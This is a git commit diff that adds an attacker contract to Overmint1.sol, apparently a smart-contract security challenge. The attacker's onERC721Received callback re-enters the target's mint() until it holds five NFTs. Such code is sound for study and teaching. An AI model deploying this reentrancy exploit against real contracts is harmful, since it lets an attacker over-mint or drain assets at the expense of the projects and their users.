a7ea52de2039196cbaa0efd1589572d6825bc0f1
gayatrigt <128085413+gayatrigt@users.noreply.github.com>
2024-12-23 19:03:23 +0530

    Added Attack code for Overmint1.sol

--- contracts/Overmint1.sol
+++ contracts/Overmint1.sol
@@ -2,6 +2,7 @@
 pragma solidity 0.8.15;
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract Overmint1 is ERC721 {
     using Address for address;
@@ -19,5 +20,42 @@ contract Overmint1 is ERC721 {
 
     function success(address _attacker) external view returns (bool) {
         return balanceOf(_attacker) == 5;
+    }
+}
+
+contract Overmint1Attacker is IERC721Receiver {
+    // Counter to track number of mints
+    uint256 private mintCount;
+    
+    // Reference to target contract
+    Overmint1 public target;
+    
+    constructor(address _target) {
+        target = Overmint1(_target);
+    }
+    
+    // Function to start the attack
+    function attack() external {
+        // Start with first mint
+        target.mint();
+    }
+    
+    // This function is called by _safeMint
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        // Increment our count
+        mintCount++;
+        
+        // If we haven't minted 5 NFTs yet, mint again
+        if (mintCount < 5) {
+            target.mint();
+        }
+        
+        // Return the expected selector
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
